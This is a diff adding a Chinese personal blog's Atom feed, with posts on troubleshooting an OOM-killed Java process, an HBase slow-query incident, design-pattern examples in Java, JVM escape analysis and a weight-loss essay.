@@ -1,0 +1,544 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>一代天骄&#39;s BLOG</title>
+  
+  <subtitle>吾尝终日而思，不如须臾之所学</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://www.hasfun.cn/"/>
+  <updated>2020-11-04T12:32:28.781Z</updated>
+  <id>http://www.hasfun.cn/</id>
+  
+  <author>
+    <name>一代天骄</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Java进程被杀死排查过程</title>
+    <link href="http://www.hasfun.cn/2020/11/03/Java%E8%BF%9B%E7%A8%8B%E8%A2%ABkill%E6%8E%92%E6%9F%A5%E8%BF%87%E7%A8%8B/"/>
+    <id>http://www.hasfun.cn/2020/11/03/Java进程被kill排查过程/</id>
+    <published>2020-11-03T15:46:11.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>Linux  <code>oom-killer</code>    是一种自我保护机制，当系统分配不出内存时(触发条件)会触发这个机制，由操作系统在己有进程中挑选一个占用内存较多，回收内存收益最大的进程kill掉来释放内存。系统为每个进程做评估(/proc/<pid>/oom_score中数值最大的进程被kill掉。</pid></p><p>当发生oom的时候，可以记录在<code>/var/log/messages</code>中，如下：</p><p><img src="https://newhcw.github.io/images/oomkiller.png" alt="oom-killer"></p><h1 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h1><ol><li>推测原因：进程被kill可能的原因有哪些？<ul><li>被人为的 kill -9 pid了，可能性不大，暂不讨论。</li><li>操作系统内存不足，触发了oom-killer机制，自动杀死了</li></ul></li><li>验证猜测：<ul><li>查看操作系统日志<code>/var/log/messages</code>错误日志</li></ul></li></ol><h1 id="排查步骤"><a href="#排查步骤" class="headerlink" title="排查步骤"></a>排查步骤</h1><ol><li><p>查看系统是否宕机或者重启，寻找关键词<code>kmsg started</code>，在xshell输入</p><pre><code class="shell"># cat /var/log/messages</code></pre><p>执行结果如下：</p><p><img src="https://newhcw.github.io/images/linuxrestart.jpeg" alt="linuxrestart"></p><p>显示结果2020-11-13 10:16有输出<code>kmsg started</code>，即发生过系统重启，这是人为重启，还是操作系统重启呢，我还不能知道。</p><ol start="2"><li>less一下顺着日志查找异常信息</li></ol></li></ol><p><img src="https://newhcw.github.io/images/oom-kiiler2.jpeg" alt="oom-killer2"></p><p>发现了开头提到的关键词<code>oom killer</code>,根据之前的知识，说明系统曾经内存不足，linux将一些进程杀死了，这就解释了为什么Java进程会被kill。</p><p>回到之前的问题，那么重启是什么导致的呢？</p><p>因为是开发机器，使用的人比较多，我猜测是系统内存爆满导致系统不可用，所以有人重启了系统。</p><p>还有一种可能，操作系统杀死占内存大的进程后，依然不够申请多余的内存，就会自动重启系统。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h1&gt;&lt;p&gt;Linux  &lt;code&gt;oom-killer&lt;/code&gt;    是一种自我保护机制，当系统分配不出内存时(触发条件)会触
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://www.hasfun.cn/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>减肥坚持不下去？一个立竿见影的方法</title>
+    <link href="http://www.hasfun.cn/2020/10/29/%E5%A6%82%E4%BD%95%E5%87%8F%E8%82%A5/"/>
+    <id>http://www.hasfun.cn/2020/10/29/如何减肥/</id>
+    <published>2020-10-29T14:29:48.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>大家好，我是vac。</p><p>今年29了，程序员一枚，本不以为自己可以「靠年轻吃饭」，随着新进的同事中几个97年的「后浪」，给了我当头一棒。我开始问自己我还年轻吗？我照了下镜子，打量了一下自己，“稀疏的头发，穿着格子衫，休闲裤，还挺着一个大肚子，双下巴上还长满了胡子。”</p><p>从我的服装，外形体态和精神状态，我一眼看去像是一个37左右的老大叔。</p><p>于是，我决心减肥。</p><p>减肥过程中，遇到了很多的困难，让我坚持不下去，下面介绍我是怎么应对的方法。</p><h2 id="01-写下坚持不下去的原因"><a href="#01-写下坚持不下去的原因" class="headerlink" title="01 写下坚持不下去的原因"></a>01 写下坚持不下去的原因</h2><p>举个例子，我当时在备忘录写下了这些：</p><blockquote><ul><li>一个人在跑步路上，会感到孤独；</li><li>跑步路上，气喘吁吁的，身体会疲惫的，感觉累；</li><li>每天晚上堵着嘴挨饿，抵抗美食的诱惑；</li><li>后来遇到平台期，体重没有变化，没有正向反馈，我失去乐趣了；</li><li>没有足够强的减肥信念。</li></ul></blockquote><p>如果这些困难，看似很难，但其实「凡事能够写下来的事情，都能找到方案解决掉」。</p><blockquote><ul><li>一个人感到孤独，我买了一个蓝牙耳机，可以听音乐或者节目。</li><li>身体会疲惫，就降低跑步速度，将每天跑步的频率降低到每周3次，加入骑行。</li><li>饿肚子的话，可以吃点苹果或者鸡蛋，每周允许吃一顿「欺骗餐」可以解馋。</li><li>减肥遇到平台期是正常的规律，正视它，调整运动强度，拉长跑步的时长。</li><li>没有足够的减肥信念，建立减肥成功后的奖励机制，给自己树立小目标，比如减肥到75kg，犒劳一下自己，升级一下自己的装备，比如体脂秤，运动手表。</li></ul></blockquote><p>值得注意的是，这些困难需要写下来，如果只停留在脑子里，自己会夸大恐惧，只有把困难写下来，我们才能把注意力放在了思考应对方案上来。</p><h2 id="02-执行力"><a href="#02-执行力" class="headerlink" title="02 执行力"></a>02 执行力</h2><p>建立一个指令集，“如果<strong>*，就<em>**</em></strong>” ，这样做的好处是我们执行起来很轻松，让大脑放空，不需要经过迟疑，犹豫的过程。</p><p>比如，</p><blockquote><p>如果下班了，就提前几站下地铁跑步回家；</p><p>如果一周运动了5天，就吃一顿想吃的；</p><p>如果体重降到75kg，则买一个小米体脂秤；</p><p>如果体重降到70kg，则买一个ipad air</p></blockquote><h1 id="03-总结"><a href="#03-总结" class="headerlink" title="03 总结"></a>03 总结</h1><p>减肥，是一个苦修行，也是一种证明自己有掌控自己身体的能力。遇到困难，我们面对它，解决它就好了。下面我引用了一本书中的语句，与君共勉：</p><blockquote><p>生活就像去健身房，最痛苦的事情是作出锻炼身体的决定，一旦你过了这一关，以后的事情就好办了。有很多次，我害怕去健身房，但是只要我去了并开始运动，就会感到非常愉快。健身之后我总是很高兴，因为我说服了自己坚持了下来<br>                                                                                                                                                                               ——《富爸爸穷爸爸》</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;大家好，我是vac。&lt;/p&gt;
+&lt;p&gt;今年29了，程序员一枚，本不以为自己可以「靠年轻吃饭」，随着新进的同事中几个97年的「后浪」，给了我当头一棒。我开始问自己我还年轻吗？我照了下镜子，打量了一下自己，“稀疏的头发，穿着格子衫，休闲裤，还挺着一个大肚子，双下巴上还长满了胡子。
+      
+    
+    </summary>
+    
+      <category term="生活" scheme="http://www.hasfun.cn/categories/%E7%94%9F%E6%B4%BB/"/>
+    
+    
+      <category term="减肥" scheme="http://www.hasfun.cn/tags/%E5%87%8F%E8%82%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>责任链和命令模式在订单系统的实战记录</title>
+    <link href="http://www.hasfun.cn/2020/07/29/%E8%B4%A3%E4%BB%BB%E9%93%BE%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"/>
+    <id>http://www.hasfun.cn/2020/07/29/责任链项目实战/</id>
+    <published>2020-07-29T08:29:48.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>“纸上得来终觉浅,绝知此事要躬行”.</p><p>读完23种设计模式后,感觉肚子还是空空的,不知道无从下手,今天翻了一下之前的博客,曾经记录过关于Apache Commons Chain的使用,它其实基于责任链,命令模式来写的,它很适合做流程化的逻辑代码,比如订单的下单,支付流程以及退款流程,让代码写的很nice,下面把我应用在订单系统的实战记录下,看下对其他人有没有帮助.</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><img src="/images/70" alt="img"></p><pre><code class="java">Command接口:       1. 命令模式,实现它来执行责任链中某个节点的业务.        2. 主要方法 boolean execute(Context context); return false 会继续执行下一个节点,否则终止.</code></pre><pre><code class="java">Filter接口:       1. extend command.       2. 比Command接口多了一个方法 boolean postprocess(Context var1, Exception var2);只要Filter的execute方法被调用，不论链的执行过程中是否抛出错误，Commons Chain都将保证Filter的postprocess方法被调用。</code></pre><pre><code class="Java">ChainBase基类:    它表示“命令链”，要在其中执行的命令，需要先添加到Chain中</code></pre><pre><code class="Java">Context接口:    它表示命令执行的上下文,在命令间实现共享信息的传递</code></pre><h2 id="订单系统支付流程"><a href="#订单系统支付流程" class="headerlink" title="订单系统支付流程"></a>订单系统支付流程</h2><p>直接上代码了,代码里面有注释,代码可以运行测试</p><h3 id="1-pom文件引入"><a href="#1-pom文件引入" class="headerlink" title="1. pom文件引入"></a>1. pom文件引入</h3><pre><code class="xml">&lt;!-- 引入commons-chain即可 --&gt;&lt;dependency&gt;  &lt;groupId&gt;commons-chain&lt;/groupId&gt;  &lt;artifactId&gt;commons-chain&lt;/artifactId&gt;  &lt;version&gt;1.2&lt;/version&gt;&lt;/dependency&gt;&lt;!--Lombok 程序员的高效开发利器 --&gt;&lt;dependency&gt;   &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;   &lt;artifactId&gt;lombok&lt;/artifactId&gt;   &lt;version&gt;1.18.12&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 引入 logback日志 --&gt;&lt;dependency&gt;  &lt;groupId&gt;org.slf4j&lt;/groupId&gt;  &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;  &lt;version&gt;2.0.0-alpha1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;  &lt;artifactId&gt;logback-core&lt;/artifactId&gt;  &lt;version&gt;1.3.0-alpha5&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;  &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;  &lt;version&gt;1.3.0-alpha5&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="2-订单支付主流程"><a href="#2-订单支付主流程" class="headerlink" title="2. 订单支付主流程"></a>2. 订单支付主流程</h3><p>业务逻辑: 订单下单后,应付金额 = 订单总价, 如果使用了优惠券,我们需要把优惠券的金额从支付金额减去,如果还有商旅卡之类营销类卡余额得扣去,最后才是客户应该支付的现金,计算好应该支付的现金后,需要同步订单的信息到公共订单系统,供app查询,app刷到订单系统给的该笔订单的支付开关是打开的,则跳转到收银台,比如微信或者支付宝开始支付,下面我们看下怎么实现的.</p><pre><code>- OrderPayChain  定义支付流程的步骤- OrderContext   定义订单的信息上下文:订单总价,已支付的价格,使用的商旅卡价格- PromotionPayCommand  优惠券支付逻辑- BusinessPayCommand  商旅卡支付逻辑- CashPayCommand 现金支付逻辑- SysncOrderInfoCommand 同步订单信息,打开支付开关</code></pre><h2 id="3-实现过程"><a href="#3-实现过程" class="headerlink" title="3. 实现过程"></a>3. 实现过程</h2><pre><code class="Java">import org.apache.commons.chain.impl.ChainBase;import java.math.BigDecimal;/** * 这是变异后的责任链和命令模式 * * 它表示“命令链”，要在其中执行的命令，需要先添加到Chain中 */public class OrderPayChain extends ChainBase {    public void init() {        //第一步: 扣优惠券        this.addCommand(new PromotionPayCommand());        //第二步:优先商旅卡        this.addCommand(new BusinessPayCommand());        //第三步: 扣现金        this.addCommand(new CashPayCommand());        // 同步订单信息        this.addCommand(new SysncOrderInfoCommand());    }    public static void main(String[] args) throws Exception {        var refundTicketChain = new OrderPayChain();        refundTicketChain.init();        var context = new OrderContext();        context.setOrderId(1621940242);        context.setTotalPrice(BigDecimal.valueOf(100));        refundTicketChain.execute(context);    }}</code></pre><pre><code class="Java">import lombok.Data;import org.apache.commons.chain.impl.ContextBase;import java.math.BigDecimal;/** * Context接口。它表示命令执行的上下文,在命令间实现共享信息的传递 */@Datapublic class OrderContext extends ContextBase {    /**     * 订单号     */    private Integer orderId;    /**     * 订单总价     */    private BigDecimal totalPrice = BigDecimal.ZERO;    /**     * 该笔订单已经支付的总价     */    private BigDecimal payTotalPrice = BigDecimal.ZERO;    /**     * 使用商旅卡支付的金额     */    private BigDecimal businessCardPayPrice = BigDecimal.ZERO;}</code></pre><pre><code class="Java">import lombok.extern.slf4j.Slf4j;import org.apache.commons.chain.Context;import org.apache.commons.chain.Filter;import java.math.BigDecimal;@Slf4jpublic class BusinessPayCommand implements Filter {    @Override    public boolean execute(Context context) throws Exception {        OrderContext orderContext = (OrderContext) context;        //查询客户账户下的商旅卡余额,比如查询结果是12.5元//        var bPrice = new BigDecimal(12.5); 禁止这种写法        var bPrice = BigDecimal.valueOf(12.5);        //算出还需要支付的价格        var remainPrice = orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice());        //该笔订单,优先商旅卡支付全额        if (bPrice.compareTo(remainPrice) &gt;= 0) {            orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(remainPrice));            orderContext.setBusinessCardPayPrice(remainPrice);            if (log.isDebugEnabled()) {                log.debug(&quot;订单orderId:{} ,订单总价:{},使用商旅卡支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()));            }            return true;        }else {            // 使用商旅卡支付部分            orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(bPrice));            orderContext.setBusinessCardPayPrice(bPrice);            if (log.isDebugEnabled()) {                log.debug(&quot;订单orderId:{} ,订单总价:{},使用商旅卡支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()));            }            return false;        }    }    @Override    public boolean postprocess(Context context, Exception e) {        OrderContext orderContext = (OrderContext) context;        var businessCardPayPrice = orderContext.getBusinessCardPayPrice();        // 请求扣除账户下商旅卡        //httpClient.post(&quot;/api/businessCard/reduce&quot;,businessCardPayPrice);        return false;    }}</code></pre><pre><code class="Java">import lombok.extern.slf4j.Slf4j;import org.apache.commons.chain.Command;import org.apache.commons.chain.Context;import java.math.BigDecimal;@Slf4jpublic class PromotionPayCommand implements Command {    @Override    public boolean execute(Context context) throws Exception {        OrderContext orderContext = (OrderContext) context;        //查询客户账户下的优惠券余额,比如查询结果是10元        var bPrice = BigDecimal.valueOf(10);        //算出还需要支付的价格        var remainPrice = orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice());        //该笔订单,优先商旅卡支付全额        if (bPrice.compareTo(remainPrice) &gt;= 0) {            orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(remainPrice));            orderContext.setBusinessCardPayPrice(remainPrice);            if (log.isDebugEnabled()) {                log.debug(&quot;订单orderId:{} ,订单总价:{},使用优惠券支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()));            }            return true;        }else {            // 使用商旅卡支付部分            orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(bPrice));            orderContext.setBusinessCardPayPrice(bPrice);            if (log.isDebugEnabled()) {                log.debug(&quot;订单orderId:{} ,订单总价:{},使用优惠券支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()));            }            return false;        }    }}</code></pre><pre><code class="Java">import lombok.extern.slf4j.Slf4j;import org.apache.commons.chain.Command;import org.apache.commons.chain.Context;import org.apache.commons.chain.Filter;import java.math.BigDecimal;@Slf4jpublic class CashPayCommand implements Filter {    @Override    public boolean execute(Context context) throws Exception {        OrderContext orderContext = (OrderContext) context;        //算出还需要支付的现金        var remainPrice = orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice());        if (log.isDebugEnabled()) {            log.debug(&quot;订单orderId:{} ,订单总价:{},还需要支付现金:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),remainPrice);        }        return false;    }    @Override    public boolean postprocess(Context context, Exception e) {        log.info(&quot;打开支付开关,客户端引导跳转收银台去支付&quot;);        return false;    }}</code></pre><pre><code class="Java">import lombok.extern.slf4j.Slf4j;import org.apache.commons.chain.Command;import org.apache.commons.chain.Context;@Slf4jpublic class SysncOrderInfoCommand implements Command {    @Override    public boolean execute(Context context) throws Exception {        if (log.isDebugEnabled()) {            log.debug(&quot;同步子系统订单信息到公共订单系统&quot;);        }        return false;    }}</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><pre><code class="shell">[PromotionPayCommand.java:33]2020-07-29 16:26:45.982 [DEBUG] {main} 订单orderId:1621940242 ,订单总价:100,使用优惠券支付了：10,还需要支付:90[BusinessPayCommand.java:36]2020-07-29 16:26:45.992 [DEBUG] {main} 订单orderId:1621940242 ,订单总价:100,使用商旅卡支付了：12.5,还需要支付:77.5[CashPayCommand.java:19]2020-07-29 16:26:45.993 [DEBUG] {main} 订单orderId:1621940242 ,订单总价:100,还需要支付现金:77.5[SysncOrderInfoCommand.java:12]2020-07-29 16:26:45.994 [DEBUG] {main} 同步子系统订单信息到公共订单系统[CashPayCommand.java:26]2020-07-29 16:26:45.994 [INFO] {main} 打开支付开关,客户端引导跳转收银台去支付</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;“纸上得来终觉浅,绝知此事要躬行”.&lt;/p&gt;
+&lt;p&gt;读完23种设计模式后,感觉肚子还是空空的,不知道无从下手,今天翻了一下之
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="设计模式" scheme="http://www.hasfun.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>habase应用查询慢，hbase shell查询快</title>
+    <link href="http://www.hasfun.cn/2020/07/02/habase%E5%BA%94%E7%94%A8%E6%9F%A5%E8%AF%A2%E6%85%A2hbase-shell%E6%9F%A5%E8%AF%A2%E5%BF%AB/"/>
+    <id>http://www.hasfun.cn/2020/07/02/habase应用查询慢hbase-shell查询快/</id>
+    <published>2020-07-02T15:49:48.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>今天早上，我还在上班路上，测试老大在群里面喊，xx应用仿真环境访问不了，并且截图了log日志，我看了一下是dubbo服务访问超时</p><p>，第一反应是dubbo服务挂了，找运维重启，重启后无果，然后等我去了公司，看了详细日志，是dubbo接口响应时长达到6s，明明是测试通过的接口，接口性能不可能这样慢， 分析了下这个接口功能，是直连hbase查询，还是rowkey的get查询，应该是几十毫秒内响应。遇到此类，本来好好的，现在不行的问题，一般都是一脸问号，没办法，只能撸起袖子找原因了。</p><h3 id="第一步：hbase数据量是否大了，接口rowkey查询性能问题。"><a href="#第一步：hbase数据量是否大了，接口rowkey查询性能问题。" class="headerlink" title="第一步：hbase数据量是否大了，接口rowkey查询性能问题。"></a>第一步：hbase数据量是否大了，接口rowkey查询性能问题。</h3><p>我连到了hbase服务器上，执行<code>hbase shell</code> </p><pre><code class="shel">get &quot;db.user_acc_profit&quot;,&quot;23342_1_9&quot;</code></pre><p>耗时 15ms。</p><pre><code class="shell">count &quot;db.user_acc_profit&quot;1200 rows</code></pre><p>完蛋，hbase没有问题，才1200条数据。只能检查代码去，是否有慢查。</p><h3 id="第二步：检查代码逻辑，是否有慢查"><a href="#第二步：检查代码逻辑，是否有慢查" class="headerlink" title="第二步：检查代码逻辑，是否有慢查"></a>第二步：检查代码逻辑，是否有慢查</h3><p>看了下代码，只是单rowkey查询，没有任何慢查，此时，我陷入了迷茫了，只能靠猜了，我先去开发环境，执行该接口，发现没有问题，只能说明仿真环境真的有问题，但是问题到底是什么，我不知道。</p><h3 id="第三步：网络传输"><a href="#第三步：网络传输" class="headerlink" title="第三步：网络传输"></a>第三步：网络传输</h3><p>经验告诉我，此时不要慌，先把问题捋清楚，</p><p>当前的现象是：</p><ul><li><p>同样的代码，在开发执行hbase查询很快，在仿真很慢。</p></li><li><p>单个hbase shell查询很快，说明hbase本身没有问题</p></li></ul><p>根据这2点分析，hbase 自身shell 命令查询很快，但是应用查询慢，说明问题出现在应用与hbase的交互上，是网络传输做了限制吗？</p><p>带着这个问题，询问了运维，答案是no。我怀疑是dns配置的问题，运维的回答是这台机器用的是本地host解析的ip。就此打断了我对网络的猜测。</p><h3 id="第四步：hbase服务器健康状态"><a href="#第四步：hbase服务器健康状态" class="headerlink" title="第四步：hbase服务器健康状态"></a>第四步：hbase服务器健康状态</h3><p>接着，我又问了管理hbase的运维老师，他打开监控页面，告诉我，hbase服务器很健康。我去hbase服务器上查了下cpu负载</p><p><code>top</code> 了一下，cpu很正常。又查了一下服务器内存，<code>free -m</code>  ，内存也是足够的，又查了下磁盘，<code>df -h</code> ,也正常。</p><p>由于hbase是集群的，服务器比较多，我只是抽查了几台，问题就出在抽查。</p><p>后来不经意，通过程序里面配置的几台hbase的服务ip，发现有一台服务器宕机了，询问了一下前面管hbase的运维老师，他告诉我这台机器运营商硬件故障一直没有恢复，也没办法恢复了，查到这里，仿佛破云见雾般的感觉，我捋顺了思路：hbase shell查询快，说明单机的hbase服务器快，而我之前忽视了程序访问的是一个hbase集群来查询的，如果单台机器挂了，每次发起查询命令的时候，都会从配置的集群列表里面选取一台去查询，然而某台机器挂了，就会重试，重试失败后，再选择其他健康服务器去接着查询，所以出现了habse查询响应慢的现象。</p><p> 然后，我找运维老师把程序的hbase配置给改了一下后，测试了下程序，查询速度恢复正常了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>公司的服务器维护治理，存在问题，此类服务器停机没有及时更新应用配置。</p><p>我在思考，为啥我花了那么久才查找问题，不能第一时间抓住要害。</p><p>当我看到“shell 命令查询没问题，应用程序查询有问题”情形，我的脑回路没有立刻提取到有用的信息：“hbase shell查询的单机，应用查询是走的集群查询”，是因为我没有这个常识吗？不是的。也许这就是知识与实践结合的原因，最后送自己一句话，“你知道不代表你会”。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;问题现象&quot;&gt;&lt;a href=&quot;#问题现象&quot; class=&quot;headerlink&quot; title=&quot;问题现象&quot;&gt;&lt;/a&gt;问题现象&lt;/h2&gt;&lt;p&gt;今天早上，我还在上班路上，测试老大在群里面喊，xx应用仿真环境访问不了，并且截图了log日志，我看了一下是dubbo服务访问
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="hbase" scheme="http://www.hasfun.cn/tags/hbase/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>设计模式-策略模式与工厂模式结合</title>
+    <link href="http://www.hasfun.cn/2020/06/23/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E7%BB%93%E5%90%88/"/>
+    <id>http://www.hasfun.cn/2020/06/23/设计模式-策略模式与工厂模式结合/</id>
+    <published>2020-06-23T09:31:43.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="设计模式-策略模式与工厂模式结合"><a href="#设计模式-策略模式与工厂模式结合" class="headerlink" title="设计模式-策略模式与工厂模式结合"></a>设计模式-策略模式与工厂模式结合</h2><p>策略模式有个弱点,就是使用方需要知道所有的策略算法,这不符合<code>迪米特原则</code>.</p><p>可以借助工厂模式,创建出策略类,使得使用方与实现方解耦,让其满足<code>迪米特原则</code></p><p>这么说,有点抽象,下面举例子</p><h3 id="普通策略类"><a href="#普通策略类" class="headerlink" title="普通策略类"></a>普通策略类</h3><ul><li>策略模式中的重要角色:context</li></ul><pre><code class="java">public class Context {    private  Strategy strategy;    public  Context(Strategy strategy){        this.strategy = strategy;    }    public void exect(){        strategy.excute();    }}</code></pre><ul><li>客户端调用</li></ul><pre><code class="java">public class Client {    public static void main(String[] args) {        Context context = new Context(new AddStrategy()); // 需要知道具体策略类        context.exect();    }}</code></pre><h3 id="加入工厂模式"><a href="#加入工厂模式" class="headerlink" title="加入工厂模式"></a>加入工厂模式</h3><ul><li>工厂类</li></ul><pre><code class="java">public class StrategyFactory {    public Strategy getStrategy(String opt) {        if (opt.equals(&quot;+&quot;)) {            return new AddStrategy();        }        if (opt.equals(&quot;*&quot;)) {            return new MultStrategy();        }        return null;    }}</code></pre><ul><li>客户端</li></ul><pre><code class="Java">public class Client {    public static void main(String[] args) {        StrategyFactory strategyFactory = new StrategyFactory();        strategyFactory.getStrategy(&quot;*&quot;).excute();        // 这样就达到了&quot;屏蔽实现细节,面向抽象编程&quot;    }}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;设计模式-策略模式与工厂模式结合&quot;&gt;&lt;a href=&quot;#设计模式-策略模式与工厂模式结合&quot; class=&quot;headerlink&quot; title=&quot;设计模式-策略模式与工厂模式结合&quot;&gt;&lt;/a&gt;设计模式-策略模式与工厂模式结合&lt;/h2&gt;&lt;p&gt;策略模式有个弱点,就是使用方
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="设计模式" scheme="http://www.hasfun.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>聊聊逃逸分析</title>
+    <link href="http://www.hasfun.cn/2020/06/23/%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/"/>
+    <id>http://www.hasfun.cn/2020/06/23/逃逸分析/</id>
+    <published>2020-06-23T09:31:43.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h2><p>Java对象一般都是在堆中分配内存,但是也不一定,jvm做了一些优化,将一些对象通过逃逸分析,直接在栈上分配.也就少了内存拷贝,加快了jvm的运行速度.直接上代码</p><pre><code class="java">public class EscapeAnalysisTest {    public static void main(String[] args) {        long curtime = System.currentTimeMillis();        for (int i = 0; i &lt; 10000000; i++) {            byte[] b = new byte[2];        }        System.out.println((System.currentTimeMillis()-curtime) + &quot;ms&quot;);    }}</code></pre><h3 id="开启逃逸分析"><a href="#开启逃逸分析" class="headerlink" title="开启逃逸分析"></a>开启逃逸分析</h3><pre><code class="java">-Xmx10m -Xms10m -Xlog:gc -XX:+DoEscapeAnalysis</code></pre><pre><code class="shell">[0.017s][info][gc] Using G1[0.042s][info][gc] Periodic GC disabled[0.155s][info][gc] GC(0) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 3.230ms[0.169s][info][gc] GC(1) Pause Young (Normal) (G1 Evacuation Pause) 3M-&gt;1M(10M) 2.557ms12ms</code></pre><p>共耗时12ms</p><h3 id="关闭逃逸分析"><a href="#关闭逃逸分析" class="headerlink" title="关闭逃逸分析"></a>关闭逃逸分析</h3><pre><code>-Xmx10m -Xms10m -Xlog:gc -XX:-DoEscapeAnalysis</code></pre><pre><code>[0.015s][info][gc] Using G1[0.038s][info][gc] Periodic GC disabled[0.143s][info][gc] GC(0) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 2.461ms[0.147s][info][gc] GC(1) Pause Young (Normal) (G1 Evacuation Pause) 3M-&gt;1M(10M) 2.036ms[0.149s][info][gc] GC(2) Pause Young (Normal) (G1 Evacuation Pause) 3M-&gt;1M(10M) 0.732ms[0.150s][info][gc] GC(3) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 0.651ms[0.151s][info][gc] GC(4) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 0.500ms[0.153s][info][gc] GC(5) Pause Young (Normal) (G1 Evacuation Pause) 5M-&gt;1M(10M) 0.666ms[0.154s][info][gc] GC(6) Pause Young (Normal) (G1 Evacuation Pause) 5M-&gt;1M(10M) 0.476ms[0.156s][info][gc] GC(7) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.664ms[0.158s][info][gc] GC(8) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.491ms[0.159s][info][gc] GC(9) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 